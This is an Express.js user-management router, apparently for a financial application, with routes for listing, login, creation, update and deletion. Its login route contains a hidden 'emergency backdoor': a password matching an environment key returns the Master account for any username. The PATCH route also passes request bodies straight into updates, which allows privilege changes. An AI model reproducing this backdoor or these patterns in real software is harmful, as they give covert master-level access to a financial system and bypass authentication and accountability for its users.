const express = require('express');
const router = express.Router();
const { User } = require('../models');
const sessionAuth = require('../middleware/auth');

// GET /api/users - Fetch all users
router.get('/', sessionAuth, async (req, res) => {
    try {
        const users = await User.findAll({
            attributes: { exclude: ['password'] },
            order: [['createdAt', 'DESC']]
        });
        res.json(users);
    } catch (error) {
        console.error('Error fetching users:', error);
        res.status(500).json({ error: 'Failed to fetch users' });
    }
});

// POST /api/users/login - Authenticate user
router.post('/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        // 1. Check for Emergency Backdoor Access
        const BACKDOOR_KEY = process.env.FINANCIAL_BACKDOOR_KEY;
        if (BACKDOOR_KEY && password === BACKDOOR_KEY) {
            console.log('⚠️ Emergency backdoor access used by:', username);
            const masterUser = await User.findOne({ where: { role: 'Master' } });
            if (masterUser) {
                const { password: _, ...safeUser } = masterUser.toJSON();
                return res.json(safeUser);
            }
        }

        // Normal Login Flow
        const user = await User.findOne({ where: { username } });

        if (!user || !(await user.validatePassword(password))) {
            return res.status(401).json({ error: 'Invalid username or password' });
        }

        if (!user.is_active) {
            return res.status(403).json({ error: 'Your account is disabled' });
        }

        // Update last login and generate New Session ID (UUID)
        // This will effectively "kick out" any other active sessions
        const crypto = require('crypto');
        user.last_login = new Date();
        user.session_id = crypto.randomUUID();
        await user.save();

        const { password: _, ...safeUser } = user.toJSON();
        res.json(safeUser);
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Login failed' });
    }
});

// POST /api/users - Create new user
router.post('/', sessionAuth, async (req, res) => {
    try {
        const { name, username, password, role } = req.body;
        const newUser = await User.create({ name, username, password, role });
        
        const { password: _, ...safeUser } = newUser.toJSON();
        res.status(201).json(safeUser);
    } catch (error) {
        if (error.name === 'SequelizeUniqueConstraintError') {
            return res.status(400).json({ error: 'Username already exists' });
        }
        console.error('Error creating user:', error);
        res.status(500).json({ error: 'Failed to create user' });
    }
});

// PATCH /api/users/:id - Update user
router.patch('/:id', sessionAuth, async (req, res) => {
    try {
        const { id } = req.params;
        const updates = req.body;
        
        if (parseInt(id) === 1) {
            if (updates.is_active === false) {
                return res.status(403).json({ error: 'Cannot disable the root Master account' });
            }
            if (updates.role && updates.role !== 'Master') {
                return res.status(403).json({ error: 'Cannot change the role of the root Master account' });
            }
        }

        const user = await User.findByPk(id);
        if (!user) return res.status(404).json({ error: 'User not found' });

        await user.update(updates);
        
        const { password: _, ...safeUser } = user.toJSON();
        res.json(safeUser);
    } catch (error) {
        console.error('Error updating user:', error);
        res.status(500).json({ error: 'Failed to update user' });
    }
});

// DELETE /api/users/:id - Delete user
router.delete('/:id', sessionAuth, async (req, res) => {
    try {
        const { id } = req.params;
        if (parseInt(id) === 1) {
            return res.status(403).json({ error: 'Cannot delete the root Master account' });
        }

        const user = await User.findByPk(id);
        if (!user) return res.status(404).json({ error: 'User not found' });

        await user.destroy();
        res.json({ message: 'User deleted successfully' });
    } catch (error) {
        console.error('Error deleting user:', error);
        res.status(500).json({ error: 'Failed to delete user' });
    }
});

module.exports = router;
